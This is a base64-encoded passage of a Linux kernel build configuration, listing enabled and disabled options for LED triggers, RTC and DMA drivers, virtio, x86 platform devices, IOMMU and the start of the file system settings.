R0VSX0JBQ0tMSUdIVCBpcyBub3Qgc2V0CiMgQ09ORklHX0xFRFNfVFJJR0dFUl9DUFUgaXMgbm90
IHNldAojIENPTkZJR19MRURTX1RSSUdHRVJfQUNUSVZJVFkgaXMgbm90IHNldAojIENPTkZJR19M
RURTX1RSSUdHRVJfREVGQVVMVF9PTiBpcyBub3Qgc2V0CgojCiMgaXB0YWJsZXMgdHJpZ2dlciBp
cyB1bmRlciBOZXRmaWx0ZXIgY29uZmlnIChMRUQgdGFyZ2V0KQojCiMgQ09ORklHX0xFRFNfVFJJ
R0dFUl9UUkFOU0lFTlQgaXMgbm90IHNldAojIENPTkZJR19MRURTX1RSSUdHRVJfQ0FNRVJBIGlz
IG5vdCBzZXQKIyBDT05GSUdfTEVEU19UUklHR0VSX1BBTklDIGlzIG5vdCBzZXQKIyBDT05GSUdf
TEVEU19UUklHR0VSX05FVERFViBpcyBub3Qgc2V0CiMgQ09ORklHX0xFRFNfVFJJR0dFUl9QQVRU
RVJOIGlzIG5vdCBzZXQKIyBDT05GSUdfTEVEU19UUklHR0VSX1RUWSBpcyBub3Qgc2V0CiMgQ09O
RklHX0xFRFNfVFJJR0dFUl9JTlBVVF9FVkVOVFMgaXMgbm90IHNldAoKIwojIFNpbXBsZSBMRUQg
ZHJpdmVycwojCiMgQ09ORklHX0FDQ0VTU0lCSUxJVFkgaXMgbm90IHNldAojIENPTkZJR19JTkZJ
TklCQU5EIGlzIG5vdCBzZXQKQ09ORklHX0VEQUNfQVRPTUlDX1NDUlVCPXkKQ09ORklHX0VEQUNf
U1VQUE9SVD15CkNPTkZJR19SVENfTElCPXkKQ09ORklHX1JUQ19NQzE0NjgxOF9MSUI9eQpDT05G
SUdfUlRDX0NMQVNTPXkKIyBDT05GSUdfUlRDX0hDVE9TWVMgaXMgbm90IHNldApDT05GSUdfUlRD
X1NZU1RPSEM9eQpDT05GSUdfUlRDX1NZU1RPSENfREVWSUNFPSJydGMwIgojIENPTkZJR19SVENf
REVCVUcgaXMgbm90IHNldApDT05GSUdfUlRDX05WTUVNPXkKCiMKIyBSVEMgaW50ZXJmYWNlcwoj
CkNPTkZJR19SVENfSU5URl9TWVNGUz15CkNPTkZJR19SVENfSU5URl9QUk9DPXkKQ09ORklHX1JU
Q19JTlRGX0RFVj15CiMgQ09ORklHX1JUQ19JTlRGX0RFVl9VSUVfRU1VTCBpcyBub3Qgc2V0CiMg
Q09ORklHX1JUQ19EUlZfVEVTVCBpcyBub3Qgc2V0CgojCiMgSTJDIFJUQyBkcml2ZXJzCiMKIyBD
T05GSUdfUlRDX0RSVl9BQkI1WkVTMyBpcyBub3Qgc2V0CiMgQ09ORklHX1JUQ19EUlZfQUJFT1o5
IGlzIG5vdCBzZXQKIyBDT05GSUdfUlRDX0RSVl9BQlg4MFggaXMgbm90IHNldAojIENPTkZJR19S
VENfRFJWX0RTMTMwNyBpcyBub3Qgc2V0CiMgQ09ORklHX1JUQ19EUlZfRFMxMzc0IGlzIG5vdCBz
ZXQKIyBDT05GSUdfUlRDX0RSVl9EUzE2NzIgaXMgbm90IHNldAojIENPTkZJR19SVENfRFJWX01B
WDY5MDAgaXMgbm90IHNldAojIENPTkZJR19SVENfRFJWX1JTNUMzNzIgaXMgbm90IHNldAojIENP
TkZJR19SVENfRFJWX0lTTDEyMDggaXMgbm90IHNldAojIENPTkZJR19SVENfRFJWX0lTTDEyMDIy
IGlzIG5vdCBzZXQKIyBDT05GSUdfUlRDX0RSVl9YMTIwNSBpcyBub3Qgc2V0CiMgQ09ORklHX1JU
Q19EUlZfUENGODUyMyBpcyBub3Qgc2V0CiMgQ09ORklHX1JUQ19EUlZfUENGODUwNjMgaXMgbm90
IHNldAojIENPTkZJR19SVENfRFJWX1BDRjg1MzYzIGlzIG5vdCBzZXQKIyBDT05GSUdfUlRDX0RS
Vl9QQ0Y4NTYzIGlzIG5vdCBzZXQKIyBDT05GSUdfUlRDX0RSVl9QQ0Y4NTgzIGlzIG5vdCBzZXQK
IyBDT05GSUdfUlRDX0RSVl9NNDFUODAgaXMgbm90IHNldAojIENPTkZJR19SVENfRFJWX0JRMzJL
IGlzIG5vdCBzZXQKIyBDT05GSUdfUlRDX0RSVl9TMzUzOTBBIGlzIG5vdCBzZXQKIyBDT05GSUdf
UlRDX0RSVl9GTTMxMzAgaXMgbm90IHNldAojIENPTkZJR19SVENfRFJWX1JYODAxMCBpcyBub3Qg
c2V0CiMgQ09ORklHX1JUQ19EUlZfUlg4MTExIGlzIG5vdCBzZXQKIyBDT05GSUdfUlRDX0RSVl9S
WDg1ODEgaXMgbm90IHNldAojIENPTkZJR19SVENfRFJWX1JYODAyNSBpcyBub3Qgc2V0CiMgQ09O
RklHX1JUQ19EUlZfRU0zMDI3IGlzIG5vdCBzZXQKIyBDT05GSUdfUlRDX0RSVl9SVjMwMjggaXMg
bm90IHNldAojIENPTkZJR19SVENfRFJWX1JWMzAzMiBpcyBub3Qgc2V0CiMgQ09ORklHX1JUQ19E
UlZfUlY4ODAzIGlzIG5vdCBzZXQKIyBDT05GSUdfUlRDX0RSVl9TRDMwNzggaXMgbm90IHNldAoK
IwojIFNQSSBSVEMgZHJpdmVycwojCkNPTkZJR19SVENfSTJDX0FORF9TUEk9eQoKIwojIFNQSSBh
bmQgSTJDIFJUQyBkcml2ZXJzCiMKIyBDT05GSUdfUlRDX0RSVl9EUzMyMzIgaXMgbm90IHNldAoj
IENPTkZJR19SVENfRFJWX1BDRjIxMjcgaXMgbm90IHNldAojIENPTkZJR19SVENfRFJWX1JWMzAy
OUMyIGlzIG5vdCBzZXQKIyBDT05GSUdfUlRDX0RSVl9SWDYxMTAgaXMgbm90IHNldAoKIwojIFBs
YXRmb3JtIFJUQyBkcml2ZXJzCiMKQ09ORklHX1JUQ19EUlZfQ01PUz15CiMgQ09ORklHX1JUQ19E
UlZfRFMxMjg2IGlzIG5vdCBzZXQKIyBDT05GSUdfUlRDX0RSVl9EUzE1MTEgaXMgbm90IHNldAoj
IENPTkZJR19SVENfRFJWX0RTMTU1MyBpcyBub3Qgc2V0CiMgQ09ORklHX1JUQ19EUlZfRFMxNjg1
X0ZBTUlMWSBpcyBub3Qgc2V0CiMgQ09ORklHX1JUQ19EUlZfRFMxNzQyIGlzIG5vdCBzZXQKIyBD
T05GSUdfUlRDX0RSVl9EUzI0MDQgaXMgbm90IHNldAojIENPTkZJR19SVENfRFJWX1NUSzE3VEE4
IGlzIG5vdCBzZXQKIyBDT05GSUdfUlRDX0RSVl9NNDhUODYgaXMgbm90IHNldAojIENPTkZJR19S
VENfRFJWX000OFQzNSBpcyBub3Qgc2V0CiMgQ09ORklHX1JUQ19EUlZfTTQ4VDU5IGlzIG5vdCBz
ZXQKIyBDT05GSUdfUlRDX0RSVl9NU002MjQyIGlzIG5vdCBzZXQKIyBDT05GSUdfUlRDX0RSVl9S
UDVDMDEgaXMgbm90IHNldAoKIwojIG9uLUNQVSBSVEMgZHJpdmVycwojCiMgQ09ORklHX1JUQ19E
UlZfRlRSVEMwMTAgaXMgbm90IHNldAoKIwojIEhJRCBTZW5zb3IgUlRDIGRyaXZlcnMKIwojIENP
TkZJR19SVENfRFJWX0dPTERGSVNIIGlzIG5vdCBzZXQKQ09ORklHX0RNQURFVklDRVM9eQojIENP
TkZJR19ETUFERVZJQ0VTX0RFQlVHIGlzIG5vdCBzZXQKCiMKIyBETUEgRGV2aWNlcwojCkNPTkZJ
R19ETUFfRU5HSU5FPXkKQ09ORklHX0RNQV9WSVJUVUFMX0NIQU5ORUxTPXkKQ09ORklHX0RNQV9B
Q1BJPXkKIyBDT05GSUdfQUxURVJBX01TR0RNQSBpcyBub3Qgc2V0CiMgQ09ORklHX0lOVEVMX0lE
TUE2NCBpcyBub3Qgc2V0CiMgQ09ORklHX0lOVEVMX0lEWEQgaXMgbm90IHNldAojIENPTkZJR19J
TlRFTF9JRFhEX0NPTVBBVCBpcyBub3Qgc2V0CiMgQ09ORklHX0lOVEVMX0lPQVRETUEgaXMgbm90
IHNldAojIENPTkZJR19QTFhfRE1BIGlzIG5vdCBzZXQKIyBDT05GSUdfWElMSU5YX0RNQSBpcyBu
b3Qgc2V0CiMgQ09ORklHX1hJTElOWF9YRE1BIGlzIG5vdCBzZXQKIyBDT05GSUdfQU1EX1BURE1B
IGlzIG5vdCBzZXQKIyBDT05GSUdfUUNPTV9ISURNQV9NR01UIGlzIG5vdCBzZXQKIyBDT05GSUdf
UUNPTV9ISURNQSBpcyBub3Qgc2V0CkNPTkZJR19EV19ETUFDX0NPUkU9eQojIENPTkZJR19EV19E
TUFDIGlzIG5vdCBzZXQKIyBDT05GSUdfRFdfRE1BQ19QQ0kgaXMgbm90IHNldAojIENPTkZJR19E
V19FRE1BIGlzIG5vdCBzZXQKQ09ORklHX0hTVV9ETUE9eQojIENPTkZJR19TRl9QRE1BIGlzIG5v
dCBzZXQKIyBDT05GSUdfSU5URUxfTERNQSBpcyBub3Qgc2V0CgojCiMgRE1BIENsaWVudHMKIwoj
IENPTkZJR19BU1lOQ19UWF9ETUEgaXMgbm90IHNldAojIENPTkZJR19ETUFURVNUIGlzIG5vdCBz
ZXQKCiMKIyBETUFCVUYgb3B0aW9ucwojCkNPTkZJR19TWU5DX0ZJTEU9eQojIENPTkZJR19TV19T
WU5DIGlzIG5vdCBzZXQKIyBDT05GSUdfVURNQUJVRiBpcyBub3Qgc2V0CiMgQ09ORklHX0RNQUJV
Rl9NT1ZFX05PVElGWSBpcyBub3Qgc2V0CiMgQ09ORklHX0RNQUJVRl9ERUJVRyBpcyBub3Qgc2V0
CiMgQ09ORklHX0RNQUJVRl9TRUxGVEVTVFMgaXMgbm90IHNldAojIENPTkZJR19ETUFCVUZfSEVB
UFMgaXMgbm90IHNldAojIENPTkZJR19ETUFCVUZfU1lTRlNfU1RBVFMgaXMgbm90IHNldAojIGVu
ZCBvZiBETUFCVUYgb3B0aW9ucwoKIyBDT05GSUdfVUlPIGlzIG5vdCBzZXQKIyBDT05GSUdfVkZJ
TyBpcyBub3Qgc2V0CiMgQ09ORklHX1ZJUlRfRFJJVkVSUyBpcyBub3Qgc2V0CkNPTkZJR19WSVJU
SU9fQU5DSE9SPXkKQ09ORklHX1ZJUlRJTz15CkNPTkZJR19WSVJUSU9fUENJX0xJQj15CkNPTkZJ
R19WSVJUSU9fUENJX0xJQl9MRUdBQ1k9eQpDT05GSUdfVklSVElPX01FTlU9eQpDT05GSUdfVklS
VElPX1BDST15CkNPTkZJR19WSVJUSU9fUENJX0FETUlOX0xFR0FDWT15CkNPTkZJR19WSVJUSU9f
UENJX0xFR0FDWT15CiMgQ09ORklHX1ZJUlRJT19CQUxMT09OIGlzIG5vdCBzZXQKQ09ORklHX1ZJ
UlRJT19JTlBVVD15CiMgQ09ORklHX1ZJUlRJT19NTUlPIGlzIG5vdCBzZXQKQ09ORklHX1ZJUlRJ
T19ETUFfU0hBUkVEX0JVRkZFUj15CiMgQ09ORklHX1ZJUlRJT19ERUJVRyBpcyBub3Qgc2V0CiMg
Q09ORklHX1ZEUEEgaXMgbm90IHNldApDT05GSUdfVkhPU1RfTUVOVT15CiMgQ09ORklHX1ZIT1NU
X05FVCBpcyBub3Qgc2V0CiMgQ09ORklHX1ZIT1NUX0NST1NTX0VORElBTl9MRUdBQ1kgaXMgbm90
IHNldAoKIwojIE1pY3Jvc29mdCBIeXBlci1WIGd1ZXN0IHN1cHBvcnQKIwojIENPTkZJR19IWVBF
UlYgaXMgbm90IHNldAojIGVuZCBvZiBNaWNyb3NvZnQgSHlwZXItViBndWVzdCBzdXBwb3J0Cgoj
IENPTkZJR19HUkVZQlVTIGlzIG5vdCBzZXQKIyBDT05GSUdfQ09NRURJIGlzIG5vdCBzZXQKIyBD
T05GSUdfU1RBR0lORyBpcyBub3Qgc2V0CiMgQ09ORklHX0dPTERGSVNIIGlzIG5vdCBzZXQKIyBD
T05GSUdfQ0hST01FX1BMQVRGT1JNUyBpcyBub3Qgc2V0CiMgQ09ORklHX0NaTklDX1BMQVRGT1JN
UyBpcyBub3Qgc2V0CiMgQ09ORklHX01FTExBTk9YX1BMQVRGT1JNIGlzIG5vdCBzZXQKQ09ORklH
X1NVUkZBQ0VfUExBVEZPUk1TPXkKIyBDT05GSUdfU1VSRkFDRV8zX1BPV0VSX09QUkVHSU9OIGlz
IG5vdCBzZXQKIyBDT05GSUdfU1VSRkFDRV9HUEUgaXMgbm90IHNldAojIENPTkZJR19TVVJGQUNF
X1BSTzNfQlVUVE9OIGlzIG5vdCBzZXQKQ09ORklHX1g4Nl9QTEFURk9STV9ERVZJQ0VTPXkKQ09O
RklHX0FDUElfV01JPXkKQ09ORklHX1dNSV9CTU9GPXkKIyBDT05GSUdfSFVBV0VJX1dNSSBpcyBu
b3Qgc2V0CiMgQ09ORklHX01YTV9XTUkgaXMgbm90IHNldAojIENPTkZJR19OVklESUFfV01JX0VD
X0JBQ0tMSUdIVCBpcyBub3Qgc2V0CiMgQ09ORklHX1hJQU9NSV9XTUkgaXMgbm90IHNldAojIENP
TkZJR19HSUdBQllURV9XTUkgaXMgbm90IHNldAojIENPTkZJR19ZT0dBQk9PSyBpcyBub3Qgc2V0
CiMgQ09ORklHX0FDRVJIREYgaXMgbm90IHNldAojIENPTkZJR19BQ0VSX1dJUkVMRVNTIGlzIG5v
dCBzZXQKIyBDT05GSUdfQUNFUl9XTUkgaXMgbm90IHNldAojIENPTkZJR19BTURfUE1DIGlzIG5v
dCBzZXQKIyBDT05GSUdfQU1EX0hTTVAgaXMgbm90IHNldAojIENPTkZJR19BTURfV0JSRiBpcyBu
b3Qgc2V0CiMgQ09ORklHX0FEVl9TV0JVVFRPTiBpcyBub3Qgc2V0CiMgQ09ORklHX0FQUExFX0dN
VVggaXMgbm90IHNldAojIENPTkZJR19BU1VTX0xBUFRPUCBpcyBub3Qgc2V0CiMgQ09ORklHX0FT
VVNfV0lSRUxFU1MgaXMgbm90IHNldAojIENPTkZJR19BU1VTX1dNSSBpcyBub3Qgc2V0CkNPTkZJ
R19FRUVQQ19MQVBUT1A9eQojIENPTkZJR19YODZfUExBVEZPUk1fRFJJVkVSU19ERUxMIGlzIG5v
dCBzZXQKIyBDT05GSUdfQU1JTE9fUkZLSUxMIGlzIG5vdCBzZXQKIyBDT05GSUdfRlVKSVRTVV9M
QVBUT1AgaXMgbm90IHNldAojIENPTkZJR19GVUpJVFNVX1RBQkxFVCBpcyBub3Qgc2V0CiMgQ09O
RklHX0dQRF9QT0NLRVRfRkFOIGlzIG5vdCBzZXQKIyBDT05GSUdfWDg2X1BMQVRGT1JNX0RSSVZF
UlNfSFAgaXMgbm90IHNldAojIENPTkZJR19XSVJFTEVTU19IT1RLRVkgaXMgbm90IHNldAojIENP
TkZJR19JQk1fUlRMIGlzIG5vdCBzZXQKIyBDT05GSUdfSURFQVBBRF9MQVBUT1AgaXMgbm90IHNl
dAojIENPTkZJR19TRU5TT1JTX0hEQVBTIGlzIG5vdCBzZXQKIyBDT05GSUdfVEhJTktQQURfQUNQ
SSBpcyBub3Qgc2V0CiMgQ09ORklHX1RISU5LUEFEX0xNSSBpcyBub3Qgc2V0CiMgQ09ORklHX0lO
VEVMX0FUT01JU1AyX1BNIGlzIG5vdCBzZXQKIyBDT05GSUdfSU5URUxfSUZTIGlzIG5vdCBzZXQK
IyBDT05GSUdfSU5URUxfU0FSX0lOVDEwOTIgaXMgbm90IHNldAoKIwojIEludGVsIFNwZWVkIFNl
bGVjdCBUZWNobm9sb2d5IGludGVyZmFjZSBzdXBwb3J0CiMKIyBDT05GSUdfSU5URUxfU1BFRURf
U0VMRUNUX0lOVEVSRkFDRSBpcyBub3Qgc2V0CiMgZW5kIG9mIEludGVsIFNwZWVkIFNlbGVjdCBU
ZWNobm9sb2d5IGludGVyZmFjZSBzdXBwb3J0CgojIENPTkZJR19JTlRFTF9XTUlfU0JMX0ZXX1VQ
REFURSBpcyBub3Qgc2V0CiMgQ09ORklHX0lOVEVMX1dNSV9USFVOREVSQk9MVCBpcyBub3Qgc2V0
CgojCiMgSW50ZWwgVW5jb3JlIEZyZXF1ZW5jeSBDb250cm9sCiMKIyBDT05GSUdfSU5URUxfVU5D
T1JFX0ZSRVFfQ09OVFJPTCBpcyBub3Qgc2V0CiMgZW5kIG9mIEludGVsIFVuY29yZSBGcmVxdWVu
Y3kgQ29udHJvbAoKIyBDT05GSUdfSU5URUxfSElEX0VWRU5UIGlzIG5vdCBzZXQKIyBDT05GSUdf
SU5URUxfVkJUTiBpcyBub3Qgc2V0CiMgQ09ORklHX0lOVEVMX09BS1RSQUlMIGlzIG5vdCBzZXQK
IyBDT05GSUdfSU5URUxfUFVOSVRfSVBDIGlzIG5vdCBzZXQKIyBDT05GSUdfSU5URUxfUlNUIGlz
IG5vdCBzZXQKIyBDT05GSUdfSU5URUxfU01BUlRDT05ORUNUIGlzIG5vdCBzZXQKIyBDT05GSUdf
SU5URUxfVFVSQk9fTUFYXzMgaXMgbm90IHNldAojIENPTkZJR19JTlRFTF9WU0VDIGlzIG5vdCBz
ZXQKIyBDT05GSUdfQUNQSV9RVUlDS1NUQVJUIGlzIG5vdCBzZXQKIyBDT05GSUdfTVNJX0VDIGlz
IG5vdCBzZXQKIyBDT05GSUdfTVNJX0xBUFRPUCBpcyBub3Qgc2V0CiMgQ09ORklHX01TSV9XTUkg
aXMgbm90IHNldAojIENPTkZJR19NU0lfV01JX1BMQVRGT1JNIGlzIG5vdCBzZXQKIyBDT05GSUdf
U0FNU1VOR19MQVBUT1AgaXMgbm90IHNldAojIENPTkZJR19TQU1TVU5HX1ExMCBpcyBub3Qgc2V0
CiMgQ09ORklHX1RPU0hJQkFfQlRfUkZLSUxMIGlzIG5vdCBzZXQKIyBDT05GSUdfVE9TSElCQV9I
QVBTIGlzIG5vdCBzZXQKIyBDT05GSUdfVE9TSElCQV9XTUkgaXMgbm90IHNldAojIENPTkZJR19B
Q1BJX0NNUEMgaXMgbm90IHNldAojIENPTkZJR19DT01QQUxfTEFQVE9QIGlzIG5vdCBzZXQKIyBD
T05GSUdfTEdfTEFQVE9QIGlzIG5vdCBzZXQKIyBDT05GSUdfUEFOQVNPTklDX0xBUFRPUCBpcyBu
b3Qgc2V0CiMgQ09ORklHX1NPTllfTEFQVE9QIGlzIG5vdCBzZXQKIyBDT05GSUdfU1lTVEVNNzZf
QUNQSSBpcyBub3Qgc2V0CiMgQ09ORklHX1RPUFNUQVJfTEFQVE9QIGlzIG5vdCBzZXQKIyBDT05G
SUdfTUxYX1BMQVRGT1JNIGlzIG5vdCBzZXQKIyBDT05GSUdfSU5TUFVSX1BMQVRGT1JNX1BST0ZJ
TEUgaXMgbm90IHNldAojIENPTkZJR19MRU5PVk9fV01JX0NBTUVSQSBpcyBub3Qgc2V0CiMgQ09O
RklHX0lOVEVMX0lQUyBpcyBub3Qgc2V0CiMgQ09ORklHX0lOVEVMX1NDVV9QQ0kgaXMgbm90IHNl
dAojIENPTkZJR19JTlRFTF9TQ1VfUExBVEZPUk0gaXMgbm90IHNldAojIENPTkZJR19TSUVNRU5T
X1NJTUFUSUNfSVBDIGlzIG5vdCBzZXQKIyBDT05GSUdfV0lOTUFURV9GTTA3X0tFWVMgaXMgbm90
IHNldApDT05GSUdfUDJTQj15CiMgQ09ORklHX0NPTU1PTl9DTEsgaXMgbm90IHNldAojIENPTkZJ
R19IV1NQSU5MT0NLIGlzIG5vdCBzZXQKCiMKIyBDbG9jayBTb3VyY2UgZHJpdmVycwojCkNPTkZJ
R19DTEtFVlRfSTgyNTM9eQpDT05GSUdfSTgyNTNfTE9DSz15CkNPTkZJR19DTEtCTERfSTgyNTM9
eQojIGVuZCBvZiBDbG9jayBTb3VyY2UgZHJpdmVycwoKQ09ORklHX01BSUxCT1g9eQpDT05GSUdf
UENDPXkKIyBDT05GSUdfQUxURVJBX01CT1ggaXMgbm90IHNldApDT05GSUdfSU9NTVVfSU9WQT15
CkNPTkZJR19JT01NVV9BUEk9eQpDT05GSUdfSU9NTVVfU1VQUE9SVD15CgojCiMgR2VuZXJpYyBJ
T01NVSBQYWdldGFibGUgU3VwcG9ydAojCkNPTkZJR19JT01NVV9JT19QR1RBQkxFPXkKIyBlbmQg
b2YgR2VuZXJpYyBJT01NVSBQYWdldGFibGUgU3VwcG9ydAoKIyBDT05GSUdfSU9NTVVfREVCVUdG
UyBpcyBub3Qgc2V0CiMgQ09ORklHX0lPTU1VX0RFRkFVTFRfRE1BX1NUUklDVCBpcyBub3Qgc2V0
CkNPTkZJR19JT01NVV9ERUZBVUxUX0RNQV9MQVpZPXkKIyBDT05GSUdfSU9NTVVfREVGQVVMVF9Q
QVNTVEhST1VHSCBpcyBub3Qgc2V0CkNPTkZJR19JT01NVV9ETUE9eQpDT05GSUdfSU9NTVVfU1ZB
PXkKQ09ORklHX0lPTU1VX0lPUEY9eQpDT05GSUdfQU1EX0lPTU1VPXkKQ09ORklHX0RNQVJfVEFC
TEU9eQpDT05GSUdfSU5URUxfSU9NTVU9eQojIENPTkZJR19JTlRFTF9JT01NVV9TVk0gaXMgbm90
IHNldAojIENPTkZJR19JTlRFTF9JT01NVV9ERUZBVUxUX09OIGlzIG5vdCBzZXQKQ09ORklHX0lO
VEVMX0lPTU1VX0ZMT1BQWV9XQT15CkNPTkZJR19JTlRFTF9JT01NVV9TQ0FMQUJMRV9NT0RFX0RF
RkFVTFRfT049eQpDT05GSUdfSU5URUxfSU9NTVVfUEVSRl9FVkVOVFM9eQojIENPTkZJR19JT01N
VUZEIGlzIG5vdCBzZXQKIyBDT05GSUdfSVJRX1JFTUFQIGlzIG5vdCBzZXQKIyBDT05GSUdfVklS
VElPX0lPTU1VIGlzIG5vdCBzZXQKCiMKIyBSZW1vdGVwcm9jIGRyaXZlcnMKIwojIENPTkZJR19S
RU1PVEVQUk9DIGlzIG5vdCBzZXQKIyBlbmQgb2YgUmVtb3RlcHJvYyBkcml2ZXJzCgojCiMgUnBt
c2cgZHJpdmVycwojCiMgQ09ORklHX1JQTVNHX1FDT01fR0xJTktfUlBNIGlzIG5vdCBzZXQKIyBD
T05GSUdfUlBNU0dfVklSVElPIGlzIG5vdCBzZXQKIyBlbmQgb2YgUnBtc2cgZHJpdmVycwoKIyBD
T05GSUdfU09VTkRXSVJFIGlzIG5vdCBzZXQKCiMKIyBTT0MgKFN5c3RlbSBPbiBDaGlwKSBzcGVj
aWZpYyBEcml2ZXJzCiMKCiMKIyBBbWxvZ2ljIFNvQyBkcml2ZXJzCiMKIyBlbmQgb2YgQW1sb2dp
YyBTb0MgZHJpdmVycwoKIwojIEJyb2FkY29tIFNvQyBkcml2ZXJzCiMKIyBlbmQgb2YgQnJvYWRj
b20gU29DIGRyaXZlcnMKCiMKIyBOWFAvRnJlZXNjYWxlIFFvcklRIFNvQyBkcml2ZXJzCiMKIyBl
bmQgb2YgTlhQL0ZyZWVzY2FsZSBRb3JJUSBTb0MgZHJpdmVycwoKIwojIGZ1aml0c3UgU29DIGRy
aXZlcnMKIwojIGVuZCBvZiBmdWppdHN1IFNvQyBkcml2ZXJzCgojCiMgaS5NWCBTb0MgZHJpdmVy
cwojCiMgZW5kIG9mIGkuTVggU29DIGRyaXZlcnMKCiMKIyBFbmFibGUgTGl0ZVggU29DIEJ1aWxk
ZXIgc3BlY2lmaWMgZHJpdmVycwojCiMgZW5kIG9mIEVuYWJsZSBMaXRlWCBTb0MgQnVpbGRlciBz
cGVjaWZpYyBkcml2ZXJzCgojIENPTkZJR19XUENNNDUwX1NPQyBpcyBub3Qgc2V0CgojCiMgUXVh
bGNvbW0gU29DIGRyaXZlcnMKIwojIGVuZCBvZiBRdWFsY29tbSBTb0MgZHJpdmVycwoKIyBDT05G
SUdfU09DX1RJIGlzIG5vdCBzZXQKCiMKIyBYaWxpbnggU29DIGRyaXZlcnMKIwojIGVuZCBvZiBY
aWxpbnggU29DIGRyaXZlcnMKIyBlbmQgb2YgU09DIChTeXN0ZW0gT24gQ2hpcCkgc3BlY2lmaWMg
RHJpdmVycwoKIwojIFBNIERvbWFpbnMKIwoKIwojIEFtbG9naWMgUE0gRG9tYWlucwojCiMgZW5k
IG9mIEFtbG9naWMgUE0gRG9tYWlucwoKIwojIEJyb2FkY29tIFBNIERvbWFpbnMKIwojIGVuZCBv
ZiBCcm9hZGNvbSBQTSBEb21haW5zCgojCiMgaS5NWCBQTSBEb21haW5zCiMKIyBlbmQgb2YgaS5N
WCBQTSBEb21haW5zCgojCiMgUXVhbGNvbW0gUE0gRG9tYWlucwojCiMgZW5kIG9mIFF1YWxjb21t
IFBNIERvbWFpbnMKIyBlbmQgb2YgUE0gRG9tYWlucwoKIyBDT05GSUdfUE1fREVWRlJFUSBpcyBu
b3Qgc2V0CiMgQ09ORklHX0VYVENPTiBpcyBub3Qgc2V0CiMgQ09ORklHX01FTU9SWSBpcyBub3Qg
c2V0CiMgQ09ORklHX0lJTyBpcyBub3Qgc2V0CiMgQ09ORklHX05UQiBpcyBub3Qgc2V0CiMgQ09O
RklHX1BXTSBpcyBub3Qgc2V0CgojCiMgSVJRIGNoaXAgc3VwcG9ydAojCiMgQ09ORklHX0xBTjk2
NlhfT0lDIGlzIG5vdCBzZXQKIyBlbmQgb2YgSVJRIGNoaXAgc3VwcG9ydAoKIyBDT05GSUdfSVBB
Q0tfQlVTIGlzIG5vdCBzZXQKIyBDT05GSUdfUkVTRVRfQ09OVFJPTExFUiBpcyBub3Qgc2V0Cgoj
CiMgUEhZIFN1YnN5c3RlbQojCiMgQ09ORklHX0dFTkVSSUNfUEhZIGlzIG5vdCBzZXQKIyBDT05G
SUdfVVNCX0xHTV9QSFkgaXMgbm90IHNldAojIENPTkZJR19QSFlfQ0FOX1RSQU5TQ0VJVkVSIGlz
IG5vdCBzZXQKCiMKIyBQSFkgZHJpdmVycyBmb3IgQnJvYWRjb20gcGxhdGZvcm1zCiMKIyBDT05G
SUdfQkNNX0tPTkFfVVNCMl9QSFkgaXMgbm90IHNldAojIGVuZCBvZiBQSFkgZHJpdmVycyBmb3Ig
QnJvYWRjb20gcGxhdGZvcm1zCgojIENPTkZJR19QSFlfUFhBXzI4Tk1fSFNJQyBpcyBub3Qgc2V0
CiMgQ09ORklHX1BIWV9QWEFfMjhOTV9VU0IyIGlzIG5vdCBzZXQKIyBDT05GSUdfUEhZX0lOVEVM
X0xHTV9FTU1DIGlzIG5vdCBzZXQKIyBlbmQgb2YgUEhZIFN1YnN5c3RlbQoKIyBDT05GSUdfUE9X
RVJDQVAgaXMgbm90IHNldAojIENPTkZJR19NQ0IgaXMgbm90IHNldAoKIwojIFBlcmZvcm1hbmNl
IG1vbml0b3Igc3VwcG9ydAojCiMgQ09ORklHX0RXQ19QQ0lFX1BNVSBpcyBub3Qgc2V0CiMgZW5k
IG9mIFBlcmZvcm1hbmNlIG1vbml0b3Igc3VwcG9ydAoKIyBDT05GSUdfUkFTIGlzIG5vdCBzZXQK
IyBDT05GSUdfVVNCNCBpcyBub3Qgc2V0CgojCiMgQW5kcm9pZAojCiMgQ09ORklHX0FORFJPSURf
QklOREVSX0lQQyBpcyBub3Qgc2V0CiMgZW5kIG9mIEFuZHJvaWQKCiMgQ09ORklHX0xJQk5WRElN
TSBpcyBub3Qgc2V0CiMgQ09ORklHX0RBWCBpcyBub3Qgc2V0CkNPTkZJR19OVk1FTT15CkNPTkZJ
R19OVk1FTV9TWVNGUz15CiMgQ09ORklHX05WTUVNX0xBWU9VVFMgaXMgbm90IHNldAojIENPTkZJ
R19OVk1FTV9STUVNIGlzIG5vdCBzZXQKCiMKIyBIVyB0cmFjaW5nIHN1cHBvcnQKIwojIENPTkZJ
R19TVE0gaXMgbm90IHNldAojIENPTkZJR19JTlRFTF9USCBpcyBub3Qgc2V0CiMgZW5kIG9mIEhX
IHRyYWNpbmcgc3VwcG9ydAoKIyBDT05GSUdfRlBHQSBpcyBub3Qgc2V0CiMgQ09ORklHX1RFRSBp
cyBub3Qgc2V0CiMgQ09ORklHX1NJT1ggaXMgbm90IHNldAojIENPTkZJR19TTElNQlVTIGlzIG5v
dCBzZXQKIyBDT05GSUdfSU5URVJDT05ORUNUIGlzIG5vdCBzZXQKIyBDT05GSUdfQ09VTlRFUiBp
cyBub3Qgc2V0CiMgQ09ORklHX01PU1QgaXMgbm90IHNldAojIENPTkZJR19QRUNJIGlzIG5vdCBz
ZXQKIyBDT05GSUdfSFRFIGlzIG5vdCBzZXQKIyBlbmQgb2YgRGV2aWNlIERyaXZlcnMKCiMKIyBG
aWxlIHN5c3RlbXMKIwpDT05GSUdfRENBQ0hFX1dPUkRfQUNDRVNTPXkKIyBDT05GSUdfVkFMSURB
VEVfRlNfUEFSU0VSIGlzIG5vdCBzZXQKQ09ORklHX0ZTX0lPTUFQPXkKQ09ORklHX0JVRkZFUl9I
RUFEPXkKQ09ORklHX0xFR0FDWV9ESVJFQ1RfSU89eQojIENPTkZJR19FWFQyX0ZTIGlzIG5vdCBz
ZXQKIyBDT05GSUdfRVhUM19GUyBpcyBub3Qgc2V0CkNPTkZJR19FWFQ0X0ZTPXkKQ09ORklHX0VY
VDRfVVNFX0ZPUl9FWFQyPXkKQ09ORklHX0VYVDRfRlNfUE9TSVhfQUNMPXkKQ09ORklHX0VYVDRf
RlNfU0VDVVJJVFk9eQojIENPTkZJR19FWFQ0X0RFQlVHIGlzIG5vdCBzZXQKQ09ORklHX0pCRDI9
eQojIENPTkZJR19KQkQyX0RFQlVHIGlzIG5vdCBzZXQKQ09ORklHX0ZTX01CQ0FDSEU9eQojIENP
TkZJR19SRUlTRVJGU19GUyBpcyBub3Qgc2V0CiMgQ09ORklHX0pGU19GUyBpcyBub3Qgc2V0CiMg
